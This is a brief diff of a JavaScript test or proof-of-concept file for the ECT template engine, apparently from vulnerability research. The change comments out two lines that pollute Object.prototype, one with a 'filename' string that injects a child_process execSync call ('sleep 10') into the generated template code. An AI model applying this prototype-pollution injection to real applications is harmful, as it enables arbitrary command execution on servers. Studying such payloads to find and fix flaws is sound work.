@@ -7,8 +7,8 @@ catch(e){
     console.log("[!] symbolic execution not enabled")
 }
 
-Object.prototype.inlineMap = true;
-Object.prototype.filename = "\n})\nprocess.mainModule.require('child_process').execSync('sleep 10')\n({";
+// Object.prototype.inlineMap = true;
+// Object.prototype.filename = "\n})\nprocess.mainModule.require('child_process').execSync('sleep 10')\n({";
 
 var renderer = ECT({ root : {
 				layout: '<html><head><title><%- @title %></title></head><body><% content %></body></html>',
